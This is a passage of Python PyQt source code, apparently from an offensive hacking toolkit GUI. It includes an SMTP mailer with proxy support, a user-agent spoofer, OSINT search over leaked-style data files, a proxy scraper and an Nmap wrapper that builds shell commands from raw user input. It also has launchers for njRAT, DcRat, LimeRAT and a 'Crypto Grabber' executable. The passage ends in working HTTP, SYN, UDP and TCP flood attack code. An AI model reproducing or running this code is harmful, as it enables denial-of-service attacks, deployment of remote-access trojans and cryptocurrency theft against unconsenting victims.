    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("SMTP Mailer")
        self.setWindowIcon(QIcon('imgs/smtp.png'))
        self.setFixedSize(600, 550)

        layout = QVBoxLayout()
        server_layout = self.create_settings_layout("SMTP Server")
        self.server_entry = self.create_line_edit("Server")
        self.port_entry = self.create_line_edit("Port")
        server_layout.addWidget(self.server_entry)
        server_layout.addWidget(self.port_entry)
        layout.addLayout(server_layout)

        proxy_layout = self.create_settings_layout("Proxy (optional)")
        self.proxy_entry = self.create_line_edit("Proxy Host:Port")
        proxy_layout.addWidget(self.proxy_entry)
        layout.addLayout(proxy_layout)

        creds_layout = self.create_settings_layout("Email Credentials")
        self.email_entry = self.create_line_edit("Email")
        self.password_entry = self.create_line_edit("Password", is_password=True)
        creds_layout.addWidget(self.email_entry)
        creds_layout.addWidget(self.password_entry)
        self.two_factor_checkbox = QCheckBox("Enable Two-Factor Authentication (click)")
        self.two_factor_checkbox.stateChanged.connect(self.toggle_two_factor)
        creds_layout.addWidget(self.two_factor_checkbox)
        self.two_factor_entry = self.create_line_edit("2FA Code", is_password=True)
        self.two_factor_entry.setVisible(False) 
        creds_layout.addWidget(self.two_factor_entry)
        layout.addLayout(creds_layout)

        recipient_layout = self.create_settings_layout("Recipient")
        self.recipient_entry = self.create_line_edit("Email")
        recipient_layout.addWidget(self.recipient_entry)
        layout.addLayout(recipient_layout)

        self.message_entry = QTextEdit()
        self.message_entry.setPlaceholderText("Message")
        layout.addWidget(self.message_entry)

        self.send_button = QPushButton("Send")
        self.send_button.clicked.connect(self.send_email)
        layout.addWidget(self.send_button)

        self.setLayout(layout)

    def create_settings_layout(self, title):
        layout = QVBoxLayout()
        label = QLabel(title)
        label.setStyleSheet("font-weight: bold;")
        layout.addWidget(label)
        return layout

    def create_line_edit(self, placeholder, is_password=False):
        line_edit = QLineEdit()
        line_edit.setPlaceholderText(placeholder)
        if is_password:
            line_edit.setEchoMode(QLineEdit.Password)
        return line_edit

    def toggle_two_factor(self, state):
        if state == Qt.Checked:
            self.two_factor_entry.setVisible(True)
        else:
            self.two_factor_entry.setVisible(False)

    def send_email(self):
        server = self.server_entry.text()
        port = self.port_entry.text()
        proxy = self.proxy_entry.text()
        email = self.email_entry.text()
        password = self.password_entry.text()
        recipient = self.recipient_entry.text()
        message = self.message_entry.toPlainText()
        two_factor_code = self.two_factor_entry.text() if self.two_factor_checkbox.isChecked() else None

        if not all([server, port, email, password, recipient, message]):
            QMessageBox.warning(self, "Error", "Please fill in all required fields")
            return

        try:
            msg = MIMEMultipart()
            msg['From'] = email
            msg['To'] = recipient
            msg['Subject'] = "Report"
            msg.attach(MIMEText(message, 'plain'))

            if proxy:
                proxy_host, proxy_port = proxy.split(':')
                socks.set_default_proxy(socks.SOCKS5, proxy_host, int(proxy_port))
                socks.wrap_module(smtplib)

            with smtplib.SMTP(server, int(port)) as smtp:
                smtp.starttls()
                smtp.login(email, password)

                if self.two_factor_checkbox.isChecked():
                    if not two_factor_code:
                        QMessageBox.warning(self, "Error", "Two-factor authentication is enabled, but no code was provided.")
                        return
                    smtp.auth_2fa(two_factor_code) 
                smtp.sendmail(email, recipient, msg.as_string())

            QMessageBox.information(self, "Success", "Email sent successfully")
            self.clear_fields()
        except smtplib.SMTPAuthenticationError as auth_error:
            QMessageBox.critical(self, "Authentication Error", f"Failed to authenticate: {str(auth_error)}")
        except smtplib.SMTPException as smtp_error:
            QMessageBox.critical(self, "SMTP Error", f"Failed to send email: {str(smtp_error)}")
        except ValueError as ve:
            QMessageBox.critical(self, "Value Error", str(ve))
        except Exception as e:
            QMessageBox.critical(self, "Error", f"An unexpected error occurred: {str(e)}")

    def clear_fields(self):
        for widget in [self.server_entry, self.port_entry, self.proxy_entry,
                      self.email_entry, self.password_entry, self.recipient_entry,
                      self.message_entry, self.two_factor_entry]:
            if isinstance(widget, QLineEdit):
                widget.clear()
            elif isinstance(widget, QTextEdit):
                widget.setPlainText("")



class UserAgentGenerator(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()
        self.load_user_agents()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("User-Agent Generator")
        self.setFixedSize(500, 400)
        self.setWindowIcon(QIcon('imgs/useragent.png'))  

        layout = QVBoxLayout()

        platform_layout = QHBoxLayout()
        platform_layout.addWidget(QLabel("Platform:"))
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(["All", "Windows", "Mac", "Linux", "Android", "iOS"])
        platform_layout.addWidget(self.platform_combo)
        layout.addLayout(platform_layout)

        browser_layout = QHBoxLayout()
        browser_layout.addWidget(QLabel("Browser:"))
        self.browser_combo = QComboBox()
        self.browser_combo.addItems(["All", "Chrome", "Firefox", "Safari", "Edge", "IE"])
        browser_layout.addWidget(self.browser_combo)
        layout.addLayout(browser_layout)

        self.generate_button = QPushButton("Generate User-Agent")
        self.generate_button.clicked.connect(self.generate_user_agent)
        layout.addWidget(self.generate_button)

        self.user_agent_display = QTextEdit()
        self.user_agent_display.setReadOnly(True)
        font = QFont("Courier")
        font.setPointSize(10)
        self.user_agent_display.setFont(font)
        layout.addWidget(self.user_agent_display)

        self.copy_button = QPushButton("Copy to Clipboard")
        self.copy_button.clicked.connect(self.copy_to_clipboard)
        layout.addWidget(self.copy_button)

        self.setLayout(layout)

    def load_user_agents(self):
        self.user_agents = {
            "Windows": {
                "Chrome": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Firefox": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Edge": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67",
                "IE": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
            },
            "Mac": {
                "Chrome": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Firefox": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
                "Safari": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
            },
            "Linux": {
                "Chrome": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                "Firefox": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
            },
            "Android": {
                "Chrome": "Mozilla/5.0 (Linux; Android 11; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36"
            },
            "iOS": {
                "Safari": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
            }
        }

    @pyqtSlot()
    def generate_user_agent(self):
        platform = self.platform_combo.currentText()
        browser = self.browser_combo.currentText()

        if platform == "All":
            platform = random.choice(list(self.user_agents.keys()))
        if browser == "All":
            browser = random.choice(list(self.user_agents[platform].keys()))

        try:
            user_agent = self.user_agents[platform][browser]
            self.user_agent_display.setPlainText(user_agent)
        except KeyError:
            QMessageBox.warning(self, "Error", f"No User-Agent available for {platform} - {browser}")

    @pyqtSlot()
    def copy_to_clipboard(self):
        user_agent = self.user_agent_display.toPlainText()
        if user_agent:
            clipboard = QApplication.clipboard()
            clipboard.setText(user_agent)
            QMessageBox.information(self, "Copied", "User-Agent copied to clipboard")
        else:
            QMessageBox.warning(self, "Error", "No User-Agent to copy")

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Escape:
            self.close()
            
class OSINTDatabaseSearch(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("OSINT Database Search")
        self.setWindowIcon(QIcon('imgs/osintsearch.png'))
        self.resize(1000, 800)
        
        self.setup_ui()
        self.df = None
        self.columns = []

    def setup_ui(self):
        main_layout = QVBoxLayout()
        import_layout = QHBoxLayout()
        self.import_button = QPushButton("Import File")
        self.import_button.clicked.connect(self.import_file)
        import_layout.addWidget(self.import_button)
        self.file_info = QLineEdit()
        self.file_info.setReadOnly(True)
        import_layout.addWidget(self.file_info)
        main_layout.addLayout(import_layout)

        search_settings = QGroupBox("Search Settings")
        settings_layout = QGridLayout()

        columns_group = QGroupBox("Columns to Search")
        columns_layout = QVBoxLayout()
        self.select_all_checkbox = QCheckBox("Select All Columns")
        self.select_all_checkbox.setChecked(True)
        self.select_all_checkbox.stateChanged.connect(self.toggle_all_columns)
        columns_layout.addWidget(self.select_all_checkbox)

        self.columns_scroll_area = QScrollArea()
        self.columns_scroll_area.setWidgetResizable(True)
        self.columns_widget = QWidget()
        self.columns_scroll_layout = QVBoxLayout(self.columns_widget)
        self.columns_scroll_area.setWidget(self.columns_widget)
        columns_layout.addWidget(self.columns_scroll_area)
        
        columns_group.setLayout(columns_layout)
        settings_layout.addWidget(columns_group, 0, 0, 3, 1)

        self.search_type = QComboBox()
        self.search_type.addItems(["Contains", "Starts with", "Ends with", "Exact match"])
        settings_layout.addWidget(QLabel("Search Type:"), 0, 1)
        settings_layout.addWidget(self.search_type, 0, 2)

        self.case_sensitive = QCheckBox("Case Sensitive (click) [BETA]")
        settings_layout.addWidget(self.case_sensitive, 1, 1, 1, 2)
        self.results_limit = QSpinBox()
        self.results_limit.setRange(1, 10000)
        self.results_limit.setValue(100)
        settings_layout.addWidget(QLabel("Results Limit:"), 2, 1)
        settings_layout.addWidget(self.results_limit, 2, 2)

        search_settings.setLayout(settings_layout)
        main_layout.addWidget(search_settings)
        search_layout = QHBoxLayout()
        self.query_entry = QLineEdit()
        self.query_entry.setPlaceholderText("Enter search query")
        search_layout.addWidget(self.query_entry)
        self.search_button = QPushButton("Search")
        self.search_button.clicked.connect(self.search_file)
        search_layout.addWidget(self.search_button)
        main_layout.addLayout(search_layout)
        results_layout = QVBoxLayout()
        results_label = QLabel("Search Results:")
        results_layout.addWidget(results_label)
        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        results_layout.addWidget(self.result_text)
        main_layout.addLayout(results_layout)

        self.setLayout(main_layout)

    def import_file(self):
        try:
            file_dialog = QFileDialog()
            file_path, _ = file_dialog.getOpenFileName(self, "Open File", "", "CSV Files (*.csv);;Text Files (*.txt)")
            if file_path:
                if file_path.endswith('.csv'):
                    self.df = pd.read_csv(file_path)
                elif file_path.endswith('.txt'):
                    self.df = pd.read_csv(file_path, delimiter='\t')
                
                self.columns = list(self.df.columns)
                self.file_info.setText(f"File imported: {file_path}")
                self.update_column_checkboxes()
                QMessageBox.information(self, "Success", "File imported successfully")
            else:
                QMessageBox.warning(self, "Error", "No file selected")
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Failed to import file: {e}")

    def update_column_checkboxes(self):
        for i in reversed(range(self.columns_scroll_layout.count())): 
            self.columns_scroll_layout.itemAt(i).widget().setParent(None)

        self.column_checkboxes = []
        for col in self.columns:
            cb = QCheckBox(col)
            cb.setChecked(True)
            self.column_checkboxes.append(cb)
            self.columns_scroll_layout.addWidget(cb)

    def toggle_all_columns(self, state):
        for cb in self.column_checkboxes:
            cb.setChecked(state == Qt.Checked)

    def search_file(self):
        if self.df is None:
            QMessageBox.warning(self, "Error", "Please import a file first")
            return
        query = self.query_entry.text()
        if not query:
            QMessageBox.warning(self, "Error", "Please enter a search query")
            return

        try:
            selected_columns = [cb.text() for cb in self.column_checkboxes if cb.isChecked()]
            if not selected_columns:
                QMessageBox.warning(self, "Error", "Please select at least one column to search")
                return

            search_type = self.search_type.currentText()
            case_sensitive = self.case_sensitive.isChecked()
            limit = self.results_limit.value()

            results = []
            for col in selected_columns:
                if search_type == "Contains":
                    mask = self.df[col].astype(str).str.contains(query, case=case_sensitive, na=False)
                elif search_type == "Starts with":
                    mask = self.df[col].astype(str).str.startswith(query, na=False)
                elif search_type == "Ends with":
                    mask = self.df[col].astype(str).str.endswith(query, na=False)
                elif search_type == "Exact match":
                    mask = self.df[col].astype(str) == query
                
                results.append(self.df[mask])

            final_results = pd.concat(results).drop_duplicates().head(limit)
            self.result_text.setPlainText(final_results.to_string(index=False))
        except Exception as e:
            QMessageBox.critical(self, "Error", f"Search failed: {e}")

class ProxyScraperWorker(QThread):
    progress = pyqtSignal(int)
    finished = pyqtSignal(list)
    error = pyqtSignal(str)

    def __init__(self, urls):
        super().__init__()
        self.urls = urls

    def run(self):
        proxies = []
        for i, url in enumerate(self.urls):
            try:
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                proxies.extend(response.text.splitlines())
                self.progress.emit((i + 1) * 100 // len(self.urls))
            except requests.RequestException as e:
                self.error.emit(f"Failed to scrape {url}: {e}")
                return
        self.finished.emit(proxies)

class ProxyScraper(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Proxy Scraper")
        self.setWindowIcon(QIcon('imgs/proxy.png'))
        self.setFixedSize(600, 450)
        self.init_ui()

    def init_ui(self):
        layout = QVBoxLayout()

        self.proxy_type = QComboBox()
        self.proxy_type.addItems(["All", "HTTP", "HTTPS", "SOCKS4", "SOCKS5"])
        layout.addWidget(self.proxy_type)

        self.scrape_button = QPushButton("Scrape Proxies")
        self.scrape_button.clicked.connect(self.scrape_proxies)
        layout.addWidget(self.scrape_button)

        self.progress_bar = QProgressBar()
        layout.addWidget(self.progress_bar)

        self.status_label = QLabel("Ready")
        layout.addWidget(self.status_label)

        self.proxy_list = QTextEdit()
        self.proxy_list.setReadOnly(True)
        layout.addWidget(self.proxy_list)

        self.setLayout(layout)

    def scrape_proxies(self):
        self.scrape_button.setEnabled(False)
        self.proxy_list.clear()
        self.progress_bar.setValue(0)
        self.status_label.setText("Scraping...")

        base_url = "https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/"
        urls = {
            "All": [f"{base_url}proxies.txt"],
            "HTTP": [f"{base_url}proxies-http.txt"],
            "HTTPS": [f"{base_url}proxies-https.txt"],
            "SOCKS4": [f"{base_url}proxies-socks4.txt"],
            "SOCKS5": [f"{base_url}proxies-socks5.txt"]
        }

        selected_type = self.proxy_type.currentText()
        selected_urls = urls[selected_type]

        self.worker = ProxyScraperWorker(selected_urls)
        self.worker.progress.connect(self.update_progress)
        self.worker.finished.connect(self.on_scraping_finished)
        self.worker.error.connect(self.on_scraping_error)
        self.worker.start()

    def update_progress(self, value):
        self.progress_bar.setValue(value)

    def on_scraping_finished(self, proxies):
        self.proxy_list.setPlainText("\n".join(proxies))
        self.status_label.setText(f"Scraped {len(proxies)} proxies")
        self.scrape_button.setEnabled(True)
        QMessageBox.information(self, "Success", "Proxies scraped successfully")

    def on_scraping_error(self, error_msg):
        self.status_label.setText("Error occurred")
        self.scrape_button.setEnabled(True)
        QMessageBox.critical(self, "Error", error_msg)

class NmapThread(QThread):
    result_ready = pyqtSignal(str)
    error_occurred = pyqtSignal(str)

    def __init__(self, command):
        super().__init__()
        self.command = command

    def run(self):
        try:
            result = subprocess.run(self.command, capture_output=True, text=True, shell=True)
            if result.returncode != 0:
                self.error_occurred.emit(result.stderr)
            else:
                self.result_ready.emit(result.stdout)
        except Exception as e:
            self.error_occurred.emit(str(e))

class NmapTool(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("Nmap Tool")
        self.setWindowIcon(QIcon('imgs/nmap.png'))
        self.setFixedSize(600, 400)

        layout = QVBoxLayout()

        self.target_entry = QLineEdit()
        self.target_entry.setPlaceholderText("Target IP/Domain")
        layout.addWidget(self.target_entry)

        scan_layout = QHBoxLayout()
        scan_layout.addWidget(QLabel("Scan Type:"))
        self.scan_combo = QComboBox()
        self.scan_combo.addItems(["TCP SYN Scan (-sS)", "TCP Connect Scan (-sT)", "UDP Scan (-sU)", "OS Detection (-O)", "Version Scan (-sV)"])
        scan_layout.addWidget(self.scan_combo)
        layout.addLayout(scan_layout)

        port_layout = QHBoxLayout()
        port_layout.addWidget(QLabel("Port Range:"))
        self.port_entry = QLineEdit()
        self.port_entry.setPlaceholderText("e.g., 1-1000 or - for all ports")
        port_layout.addWidget(self.port_entry)
        layout.addLayout(port_layout)

        self.arguments_entry = QLineEdit()
        self.arguments_entry.setPlaceholderText("Additional arguments")
        layout.addWidget(self.arguments_entry)

        self.run_button = QPushButton("Run Nmap")
        self.run_button.clicked.connect(self.run_nmap)
        layout.addWidget(self.run_button)

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)  
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        font = QFont("Courier")
        font.setPointSize(10)
        self.result_text.setFont(font)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    @pyqtSlot()
    def run_nmap(self):
        target = self.target_entry.text()
        if not target:
            QMessageBox.warning(self, "Error", "Please enter a target IP/Domain")
            return

        scan_type = self.scan_combo.currentText().split('(')[1].strip(')')
        port_range = self.port_entry.text()
        additional_args = self.arguments_entry.text()

        command = f"nmap {scan_type}"
        if port_range:
            command += f" -p {port_range}"
        if additional_args:
            command += f" {additional_args}"
        command += f" {target}"

        self.progress_bar.show()
        self.run_button.setEnabled(False)
        self.result_text.clear()

        self.nmap_thread = NmapThread(command)
        self.nmap_thread.result_ready.connect(self.display_result)
        self.nmap_thread.error_occurred.connect(self.show_error)
        self.nmap_thread.finished.connect(self.scan_finished)
        self.nmap_thread.start()

    @pyqtSlot(str)
    def display_result(self, result):
        self.result_text.setPlainText(result)

    @pyqtSlot(str)
    def show_error(self, error_message):
        QMessageBox.critical(self, "Error", error_message)

    @pyqtSlot()
    def scan_finished(self):
        self.progress_bar.hide()
        self.run_button.setEnabled(True)

    def keyPressEvent(self, event):
        if event.key() == Qt.Key_Escape:
            self.close()
            
class About(QDialog):
    def __init__(self, message):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("About")
        self.setWindowIcon(QIcon('imgs/about.png'))
        self.setFixedSize(300, 150)

        layout = QVBoxLayout()

        self.message_label = QLabel(message)
        layout.addWidget(self.message_label)

        self.ok_button = QPushButton("OK")
        self.ok_button.clicked.connect(self.accept)
        layout.addWidget(self.ok_button)

        self.setLayout(layout)

class IPLookupThread(QThread):
    result_ready = pyqtSignal(dict)
    error_occurred = pyqtSignal(str)

    def __init__(self, ip):
        super().__init__()
        self.ip = ip

    def run(self):
        try:
            response = requests.get(f"http://ip-api.com/json/{self.ip}", timeout=5)
            response.raise_for_status()
            data = response.json()
            if data.get("status") == "fail":
                raise ValueError(data.get("message", "Unknown error"))
            self.result_ready.emit(data)
        except requests.RequestException as e:
            self.error_occurred.emit(f"Failed to get IP info: {str(e)}")
        except ValueError as e:
            self.error_occurred.emit(f"Invalid IP or API error: {str(e)}")

class IPInfo(QDialog):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("IP Info")
        self.setWindowIcon(QIcon('imgs/ipinfo.png'))
        self.setFixedSize(400, 350)

        layout = QVBoxLayout()

        self.ip_entry = QLineEdit()
        self.ip_entry.setPlaceholderText("Enter an IP address")
        self.ip_entry.returnPressed.connect(self.lookup_ip)
        layout.addWidget(self.ip_entry)

        self.lookup_button = QPushButton("Lookup IP Info")
        self.lookup_button.clicked.connect(self.lookup_ip)
        layout.addWidget(self.lookup_button)

        self.my_ip_button = QPushButton("Lookup My IP")
        self.my_ip_button.clicked.connect(self.get_my_ip)
        layout.addWidget(self.my_ip_button)

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 0)  
        self.progress_bar.hide()
        layout.addWidget(self.progress_bar)

        self.result_text = QTextEdit()
        self.result_text.setReadOnly(True)
        layout.addWidget(self.result_text)

        self.setLayout(layout)

    def lookup_ip(self):
        ip = self.ip_entry.text().strip()
        if not ip:
            QMessageBox.warning(self, "Error", "Please enter an IP address")
            return

        self.progress_bar.show()
        self.lookup_button.setEnabled(False)
        self.my_ip_button.setEnabled(False)

        self.thread = IPLookupThread(ip)
        self.thread.result_ready.connect(self.display_result)
        self.thread.error_occurred.connect(self.show_error)
        self.thread.finished.connect(self.lookup_finished)
        self.thread.start()

    def display_result(self, data):
        info = "\n".join(f"{key.capitalize()}: {value}" for key, value in data.items() if key != "status")
        self.result_text.setPlainText(info)

    def show_error(self, error_message):
        QMessageBox.critical(self, "Error", error_message)

    def lookup_finished(self):
        self.progress_bar.hide()
        self.lookup_button.setEnabled(True)
        self.my_ip_button.setEnabled(True)

    def get_my_ip(self):
        try:
            response = requests.get("https://api64.ipify.org?format=json", timeout=5)
            response.raise_for_status()
            data = response.json()
            my_ip = data.get("ip")

            if not my_ip:
                raise ValueError("Could not retrieve IP address")

            self.ip_entry.setText(my_ip)
            self.lookup_ip()
        except requests.RequestException as e:
            QMessageBox.critical(self, "Error", f"Failed to get your IP address: {str(e)}")
        except ValueError as e:
            QMessageBox.warning(self, "Error", f"API error: {str(e)}")

class NjratMain:
    def __init__(self):
        self.app_name = "njrat.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")

#изначально тут был TeleShadow, но сейчас DcRat
class TeleShadow:
    def __init__(self):
        self.app_name = "DcRat.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")
            
            
#изначально был eagly, но я заменил на LimeRat
class Eagly:
    def __init__(self):
        self.app_name = "LimeRAT.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps/LimeRat')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")
            
            
class CryptoGrab:
    def __init__(self):
        self.app_name = "Crypto Grabber.exe"

    def launch_app(self):
        try:
            app_dir = os.path.abspath('apps/Crypto')
            app_path = os.path.join(app_dir, self.app_name)
            
            if not os.path.exists(app_path):
                raise FileNotFoundError(f"File not found: {app_path}")
            
            app_path = os.path.normpath(app_path)

            subprocess.Popen(app_path)
            print(f"Application '{self.app_name}' successfully launched.")

        except FileNotFoundError as e:
            print(f"Error: {e}")

        except Exception as e:
            print(f"Error launching application: {e}")


class DoSAttackThread(QThread):
    log_signal = pyqtSignal(str)
    progress_signal = pyqtSignal(int)

    def __init__(self, target, num_requests, attack_type, delay_range=(0.1, 0.5), timeout=5, port=80, packet_size=1024):
        super().__init__()
        self.target = target
        self.num_requests = num_requests
        self.attack_type = attack_type
        self.delay_range = delay_range
        self.timeout = timeout
        self.port = port
        self.packet_size = packet_size
        self.is_running = True

    def stop(self):
        self.is_running = False

    def run(self):
        attack_methods = {
            "HTTP GET Flood": self.http_get_flood,
            "SYN Flood": self.syn_flood,
            "UDP Flood": self.udp_flood,
            "TCP Flood": self.tcp_flood
        }
        attack_methods[self.attack_type]()

    def http_get_flood(self):
        try:
            target = self.target if self.target.startswith(('http://', 'https://')) else f"http://{self.target}"
            for i in range(self.num_requests):
                if not self.is_running:
                    break
                try:
                    response = requests.get(target, timeout=self.timeout)
                    self.log_signal.emit(f"HTTP GET request sent to {target}, status code: {response.status_code}")
                except requests.RequestException as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
                self.progress_signal.emit(int((i + 1) / self.num_requests * 100))
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")

    def syn_flood(self):
        try:
            target = self.target.replace("http://", "").replace("https://", "")
            ip = socket.gethostbyname(target)
            for i in range(self.num_requests):
                if not self.is_running:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    s.connect((ip, self.port)) 
                    s.close()
                    self.log_signal.emit(f"SYN packet sent to {ip}:{self.port}")
                except Exception as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
                self.progress_signal.emit(int((i + 1) / self.num_requests * 100))
        except socket.gaierror as e:
            self.log_signal.emit(f"DNS resolution failed: {e}")
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")

    def udp_flood(self):
        try:
            target = self.target.replace("http://", "").replace("https://", "")
            ip = socket.gethostbyname(target)
            for i in range(self.num_requests):
                if not self.is_running:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.sendto(b"A" * self.packet_size, (ip, self.port)) 
                    self.log_signal.emit(f"UDP packet sent to {ip}:{self.port} with {self.packet_size} bytes")
                except Exception as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
                self.progress_signal.emit(int((i + 1) / self.num_requests * 100))
        except socket.gaierror as e:
            self.log_signal.emit(f"DNS resolution failed: {e}")
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")

    def tcp_flood(self):
        try:
            target = self.target.replace("http://", "").replace("https://", "")
            ip = socket.gethostbyname(target)
            for i in range(self.num_requests):
                if not self.is_running:
                    break
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((ip, self.port)) 
                    s.send(b"A" * self.packet_size)
                    s.close()
                    self.log_signal.emit(f"TCP packet sent to {ip}:{self.port} with {self.packet_size} bytes")
                except Exception as e:
                    self.log_signal.emit(f"Error occurred: {e}")
                time.sleep(random.uniform(self.delay_range[0], self.delay_range[1]))
                self.progress_signal.emit(int((i + 1) / self.num_requests * 100))
        except socket.gaierror as e:
            self.log_signal.emit(f"DNS resolution failed: {e}")
        except Exception as e:
            self.log_signal.emit(f"Error occurred: {e}")

class DoSTool(QDialog):
    def __init__(self):
        super().__init__()
        self.setWindowFlags(self.windowFlags() & ~Qt.WindowContextHelpButtonHint)
        self.setWindowTitle("DoS Attack")
        self.setWindowIcon(QIcon('imgs/dos.png'))
        self.setFixedSize(600, 700)
        self.initUI()

    def initUI(self):
        layout = QVBoxLayout()
        layout.setSpacing(10)
        layout.setContentsMargins(20, 20, 20, 20)
        header_layout = QHBoxLayout()
        icon_label = QLabel()
        pixmap = QPixmap('imgs/dos.png')
        icon_label.setPixmap(pixmap.scaled(64, 64, Qt.KeepAspectRatio, Qt.SmoothTransformation))
        header_layout.addStretch()
        header_layout.addWidget(icon_label)
        header_layout.addStretch()
        layout.addLayout(header_layout)
        target_group = QGroupBox("Target Configuration")
        target_layout = QVBoxLayout()
        self.target_entry = QLineEdit()
        self.target_entry.setPlaceholderText("Enter target URL (including http:// or https://)")
        target_layout.addWidget(self.target_entry)
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        settings_layout = QHBoxLayout()
        requests_group = QGroupBox("Requests")
        requests_group_layout = QVBoxLayout()
        self.requests_entry = QLineEdit()
        self.requests_entry.setPlaceholderText("Number of requests")
        requests_group_layout.addWidget(self.requests_entry)
        requests_group.setLayout(requests_group_layout)
        settings_layout.addWidget(requests_group)
        delay_group = QGroupBox("Delay Range")
        delay_layout = QHBoxLayout()
        self.delay_min_entry = QDoubleSpinBox()
        self.delay_min_entry.setRange(0.01, 10.0)
        self.delay_min_entry.setSingleStep(0.01)
        self.delay_min_entry.setValue(0.1)
        self.delay_min_entry.setSuffix(" sec (min)")
        
        self.delay_max_entry = QDoubleSpinBox()
        self.delay_max_entry.setRange(0.01, 10.0)
        self.delay_max_entry.setSingleStep(0.01)
        self.delay_max_entry.setValue(0.5)
        self.delay_max_entry.setSuffix(" sec (max)")
        
        delay_layout.addWidget(self.delay_min_entry)
        delay_layout.addWidget(self.delay_max_entry)
        delay_group.setLayout(delay_layout)
        settings_layout.addWidget(delay_group)

        layout.addLayout(settings_layout)
        additional_group = QGroupBox("Additional Settings")
        additional_layout = QHBoxLayout()
        self.timeout_entry = QSpinBox()
        self.timeout_entry.setRange(1, 60)
        self.timeout_entry.setValue(5)
        self.timeout_entry.setPrefix("Timeout: ")
        self.timeout_entry.setSuffix(" seconds")
        additional_layout.addWidget(self.timeout_entry)
        self.attack_type_combo = QComboBox()
